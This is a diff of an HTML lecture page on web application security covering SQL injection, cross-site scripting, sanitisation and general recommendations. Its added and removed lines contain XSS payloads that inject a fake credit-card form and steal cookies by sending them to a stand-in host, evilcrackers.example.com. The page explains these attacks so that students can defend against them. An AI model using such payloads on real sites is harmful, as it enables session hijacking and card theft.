@@ -79,7 +79,7 @@ SQL query:
 it will return all records in the users table, including their credit card details!</li>
 </ul>
 <h3>Using placeholders</h3>
-<p>In fact, the technique we have been using makes use of placeholders (?) in our SQL queries, and thus protects against SQL injection. This is secure as it applies escape sequences to characters with special meaning to MySQL in the input data to ensure these SQL injection attacks cannot occur. See <a href='https://www.npmjs.com/package/mysql#escaping-query-values'>here</a> for more details.</p>
+<p>In fact, the technique we have been using makes use of placeholders (?) in our SQL queries, and thus protects against SQL injection, as long as MySQL is in the default configuration. This is secure as it applies escape sequences to characters with special meaning to MySQL in the input data to ensure these SQL injection attacks cannot occur. See <a href='https://www.npmjs.com/package/mysql#escaping-query-values'>here</a> for more details.</p>
 <h3>Prepared statements</h3>
 <p>Another approach to improving the security of scripts, and guarding against SQL injection attacks, is <em>prepared statements</em>. With prepared statements, he SQL statements are compiled (prepared) into a binary form, which is executed more rapidly by the database, and this binary form is cached and thus can then be re-used, improving the efficiency of your application.</p>
 <p>Here is an example of using prepared statements in the mysql2 API. Essentially it's the same approach as normal, but you use <code>execute()</code> rather than <code>query()</code>, and when you have finished with the statement (i.e it won't be executed again), you call <code>unprepare()</code> to free the memory used by it.</p>
@@ -95,7 +95,7 @@ it will return all records in the users table, including their credit card detai
 <h2>Cross-site scripting (XSS)</h2>
 <ul>
 <li>A subtle, easily-overlooked, but widely-exploited, security risk with untested input to a web application</li>
-<li>Attackers link to your site from websites or emails advertising your site</li>
+<li>Attackers link to your site from <strong>phishing</strong> websites or emails advertising your site</li>
 <li>However, their links contain dangerous code embedded within a URL as a parameter</li>
 <li>This code can include:
     <ul>
@@ -113,43 +113,54 @@ it will return all records in the users table, including their credit card detai
 <h3>Basic, non-harmful XSS example</h3>
 <ul>
 <li>The usual way in which XSS attacks are done involve injecting harmful JavaScript</li>
-<li>This can be done by injecting &lt;script&gt; tags into the site</li>
+<li>This can be done by injecting &lt;script&gt; tags into the site, for example via hidden form fields or parameters within a link</li>
 <li>Simple example (not harmful) of a link on a "special offers" site:
-<pre>&lt;a href="hittastic.com/buy/<em>465&lt;script&gt;alert('666 I am the devil')&lt;/script&gt;</em>"&gt;Buy From Hittastic!&lt;/a&gt;</pre>
+<pre>&lt;form method="post" action="https://hittastic.example.com/buy" /&gt;
+&lt;input type="hidden" name="id" 
+value="<em>1&lt;script&gt;alert('666 I am evil')&lt;/script&gt;</em>" /&gt;
+&lt;input type="submit" value="Buy From Hittastic!"/&gt;
+&lt;/form&gt;
 </li>
-<li>If the script sebds back the input:
+<li>If the script sends back the input:
 <pre>
-res.send(`You have selected the CD with ID ${req.params.id}`);
+res.send(`You have selected the CD with ID ${req.body.id}`);
 </pre>
-then the script would unwittingly echo out the &lt;script&gt; tag stored in $a, as it is part of the
-URL parameter, i.e. it would echo out
-<pre>You have selected the CD with ID 465&lt;script&gt;alert('666 I am the devil')&lt;/script&gt;</pre></li>
+then the script would unwittingly send to the browser the &lt;script&gt; tag stored in the form's hidden field, as it is part of the POST parameter <code>req.body.id</code> (which corresponds to the &lt;input&gt; field with a <code>name</code> of <code>id</code>, i.e. the hidden field). So. it would send 
+<pre>You have selected the CD with ID 1&lt;script&gt;alert('666 I am evil')&lt;/script&gt;</pre></li>
+
 <li>...and when the browser receives the &lt;script&gt; tag, it would run the JavaScript inside, because browsers
 process all tags returned from the server
 </li>
-<li>Result: user sees the message "666 I am the devil" as a popup in their browser</li>
+<li>Result: user sees the message "666 I am evil" as a popup in their browser</li>
 </ul>
-<h3>XSS and Cookie Theft with Embedded JavaScript</h3>
-<ul>
-<li>An even more dangerous XSS attack would involve embedded JavaScript within
-the links, to steal user's cookies</li>
-<li>e.g. the link could read:
+<h3>Fake forms</h3>
+<p>A more dangerous example (included in the live demo during the lecture) is injection of a fake HTML form into the genuine site, so that a &lt;form&gt; tag is used in the attack rather than a &lt;script&gt; tag. In this form of attack, the user will be fooled into thinking that the form is provided by the genuine site, and might then enter their credit card details... which will be sent straight back to the attacker!</p>
+<p>For example:
 <pre>
-buy/<em>123&lt;script&gt;window.location='http://evilcrackers.com/stealcookie/'%2Bdocument.cookie&lt;/script&gt;</em></pre>
-</li>
-<li>Now the ID contains some embedded JavaScript to set the user's
-current web page (window.location) to <em>evilcrackers.com/stealcookie</em> and sends user's cookies (accessible in JavaScript using <em>document.cookie</em>) to this URL
+&lt;input type="hidden" name="id" 
+value=<em>"17&lt;form action=http://evilcrackers.example.com/steal.php&gt;Input credit card:
+&lt;input name=creditcard /&gt;&lt;/form&gt;"</em> /&gt;
+</pre>
+</p>
+<h3>XSS and Cookie Theft with Embedded JavaScript</h3>
+<p>This is an even more dangerous XSS attack, involving embedded JavaScript 
+within the links, which could steal user's cookies, including potentially,
+session cookies. For example the hidden field could contain this:
+<pre>
+&lt;input type="hidden" 
+name="id" 
+value=<em>"123&lt;script&gt;window.location='http://evilcrackers.example.com/stealcookie/' 
++ document.cookie&lt;/script&gt;"</em> /&gt;</pre>
+</p>
 <ul>
-<li>The %2B is an encoded version of a + sign (2B is the ASCII hex code for +); this is because when sending
-requests, + is used to represent spaces, so a literal + would be interpreted
-as a space and hence would not work in the attack as it would be converted to a space</li>
-</ul>
+<li>Now the ID contains some embedded JavaScript to set the user's
+current web page (window.location) to <code>evilcrackers.example.com/stealcookie</code> and sends user's cookies (accessible in JavaScript using <code>document.cookie</code>) to this URL
 </li>
 <li>The user will be taken to HitTastic!, but, as the ID is echoed out, the JavaScript will immediately
-run (as in the first example) and redirect the user to <em>evilcrackers.com</em></li>
-<li>The owners of <em>evilcrackers.com/stealcookie</em> 
-will then have the session ID and can impersonate the original user</li>
-<li>If <em>evilcrackers.com</em> are really nasty, they could then redirect
+run (as in the first example) and redirect the user to <code>evilcrackers.example.com</code></li>
+<li>The owners of <code`>evilcrackers.example.com/stealcookie</code> 
+will then have the session ID and can impersonate the original user by copying the session ID to their own cookies; the genuine website will then think they are the attacked user</li>
+<li>If <code>evilcrackers.example.com</code> are really nasty, they could then redirect
 the user straight back to HitTastic!, so the user will be unaware of the
 entire process</li>
 </ul>
@@ -176,15 +187,16 @@ meaning the attack still takes place</li>
 const express = require('express');
 const app = express();
 app.get('/', (req, res) =&gt; {
-    const sanitised = xss("&lt;script&gt;alert('666 I am the devil!');&lt;/script&gt;");
+    const sanitised = xss("&lt;script&gt;alert('666 I am evil!');&lt;/script&gt;");
     res.send(sanitised);
 });
 app.listen(3000);</pre>
 If the XSS sanitisation had not occurred, then the HTML
-<pre>&lt;script&gt;alert('666 I am the devil!');&lt;/script&gt;</pre>
+<pre>&lt;script&gt;alert('666 I am evil!');&lt;/script&gt;</pre>
 would be sent back to the client, and the browser would execute the JavaScript inside the script tags. However with the use of the <code>xss</code> module, the browser receives instead:
-<pre>&amp;lt;script&amp;gt;alert('666 I am the devil!');&amp;lt;/script&amp;gt;</pre>
+<pre>&amp;lt;script&amp;gt;alert('666 I am evil!');&amp;lt;/script&amp;gt;</pre>
 and the browser will not interpret &amp;lt;script&amp;gt; as a script tag, so the attack will not take place.</p>
+<p>It's also of note that if you use EJS, this sanitisation takes place automatically when you render (without the need for the <code>xss</code> module), as long as you use &lt;%= rather than &lt;%- to render data.</p>
 <h2>Other issues</h2>
 <p>There are also other security issues which we will not have time to cover, for example Cross-Site Request Forgery (XSRF). I would recommend reading about these topics in your own time.</p>
 
@@ -192,25 +204,12 @@ and the browser will not interpret &amp;lt;script&amp;gt; as a script tag, so th
 <p>I would like to finish with a few recommendations when developing web applications, to take into account security, privacy and usability. These include:
     <ul>
     <li>Ensure your code is protected from common security attacks, such as SQL injection and XSS. Test your own application and try to deliberately exploit it.</li>
-    <li>Ensure that passwords are stored as a hashed (unreadable) form in your database, to prevent them being stolen. You can use Node's <code>bcrypt</code> module for this. For example, to hash (encode) a password when signing up:
-<pre>const encPass = await bcrypt.hash(pass, 10);</pre>
-The 10 is the number of rounds of encoding to use; 10 is a good compromise between security and performance as each round improves the security of the encoding but takes some time to execute. <br />
-To check a password when logging in, use code such as the following. Query the database to find the row for a given user, and then use <code>bcrypt.compare()</code> to compare the password entered against the hashed password in the table:
-<pre>const dbres = this.db.query('SELECT * FROM users WHERE username=?',
-    [req.body.username],
-    async(err, results, fields) =&gt;{
-        const match = await bcrypt.compare(req.body.password, dbres.rows[0].password);
-        if(match === false) {
-            // passwords don't match
-        } else {
-            // passwords do match, carry on...
-        }
-    }
-);</pre>
-See <a href='https://www.npmjs.com/package/bcrypt'>here</a> for more details.</li>
+    <li>Ensure that passwords are stored as a hashed (unreadable) form in your database, to prevent them being stolen. You can use Node's <code>bcrypt</code> module for this as we saw <a href='topic7.html#hashing'>in topic 7</a>.</li>
     <li>Use an HTTPS server when dealing with confidential data, including not only login information and card details, but also personal data. HTTPS encrypts confidential data when it is sent from client to server and vice-versa. It's now easy to setup an HTTPS server with <a href='https://letsencrypt.org'>Let's Encrypt</a>.</li>
     <li>Ensure that your application works across common contemporary browsers, including Firefox, Chrome, Edge and Safari. Use only standard web APIs, and not browser-specific extensions. Some web developers do not support Firefox, which can be a great annoyance to users of that browser.</li>
     <li>Ensure you test your site with common ad-blockers, such as uBlock Origin, enabled. Ensure your site works with "Strict" privacy enabled. Ad-blockers and strict privacy levels are used by many users to guard against at best annoying, and at worst dangerous and privacy-invading, invasive popup ads. Morally, if perhaps not legally, core functionality must still work when a user takes these measures.</li>
     </ul>
-Unfortunately some web developers ignore the last two points in particular, which can mean critical operations such as making payments might be impossible on Firefox with ad-blocker enabled.</p>
+Unfortunately some web developers ignore the last point in particular, so much so that making payments on certain sites operated by very well-known companies are impossible with ad-blocker enabled.</p>
+<h2>Examples for today</h2>
+<p>The source code for the live examples can be found <a href='https://github.com/nwcourses/nwcourses.github.io/tree/master/COM518/examples/security'>on GitHub</a>. Note that the phishing site uses PHP and Apache, rather than Node and Express - to highlight the fact that it is an entirely separate site.</p>
 </body></html>
